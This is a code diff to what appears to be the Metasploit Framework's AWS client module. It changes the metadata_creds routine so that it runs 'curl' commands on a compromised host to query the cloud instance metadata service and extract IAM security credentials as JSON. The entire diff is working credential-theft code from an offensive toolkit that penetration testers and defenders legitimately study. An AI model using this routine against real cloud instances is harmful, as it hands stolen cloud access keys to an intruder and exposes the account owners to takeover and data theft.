@@ -7,26 +7,19 @@ module Metasploit
   module Framework
     module Aws
       module Client
-        include Msf::Exploit::Remote::HttpClient
-
         def metadata_creds
-          print_status("#{peer} - looking for creds...")
-          url = '/2012-01-12/meta-data/iam/security-credentials/'
-          res = send_request_raw(
-            {
-              'method'  => 'GET',
-              'uri'     => url
-            }, 3)
-          res = send_request_raw(
-            {
-              'method'  => 'GET',
-              'uri'     => "#{url}#{res.body}/"
-            }, 3)
-
-          print_status("#{peer} - found creds")
-          return JSON.parse(res.body)
-        rescue Rex::ConnectionTimeout
-          print_error "Could not connect to the metadata service: #{datastore['RHOST'].inspect}"
+          if cmd_exec("curl --version") =~ /^curl \d/
+            url = "http://#{datastore['RHOST']}/2012-01-12/meta-data/"
+            print_status("#{peer} - looking for creds...")
+            resp = cmd_exec("curl #{url}")
+            if resp =~ /^iam$/
+              resp = cmd_exec("curl #{url}iam/")
+              if resp =~ /^security-credentials$/
+                resp = cmd_exec("curl #{url}iam/security-credentials/")
+                return JSON.parse(resp)
+              end
+            end
+          end
           {}
         end
 
